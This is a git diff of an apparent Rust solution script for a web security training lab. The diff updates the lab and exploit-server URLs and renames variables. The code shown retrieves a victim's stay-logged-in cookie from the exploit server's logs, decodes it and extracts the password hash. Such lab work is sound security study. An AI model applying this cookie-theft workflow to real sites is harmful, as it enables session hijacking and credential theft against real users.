@@ -45,10 +45,10 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let lab_url = "https://0a07001904dedc7b83692d2900f80018.web-security-academy.net";
+    let lab_url = "https://0a65002d04b3bcf283f910fa001b0060.web-security-academy.net";
 
     // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0af0009f0492dc0a83172cf1019f000a.exploit-server.net";
+    let exploit_server_url = "https://exploit-0a5a001a048bbc3883090f7601bd0005.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -65,12 +65,12 @@ fn main() {
         let cookie = extract_cookie_from_logs(&client, exploit_server_url);
 
         // if you found the cookie
-        if let Some(encrypt) = cookie {
+        if let Some(encoded) = cookie {
             // decrypt the cookie
-            let decrypted = decode_cookie(encrypt);
+            let decoded = decode_cookie(encoded);
 
             // get the hash and exclude the name
-            let hash = decrypted.split(":").nth(1).unwrap();
+            let hash = decoded.split(":").nth(1).unwrap();
 
             println!(
                 "{}: {}",
@@ -152,14 +152,14 @@ fn extract_cookie_from_logs(client: &Client, exploit_server_url: &str) -> Option
         
         // if extracting is OK
         if let Some(text) = cookie {
-            let encrypt = text.get(1).unwrap().as_str().to_string();
+            let encoded = text.get(1).unwrap().as_str().to_string();
             println!(
                 "{}",
                 "2. Get stay-logged-in cookie of the victim from exploit sever logs.. OK"
                     .white()
                     .bold()
             );
-            return Some(encrypt);
+            return Some(encoded);
         } else {
             None
         }
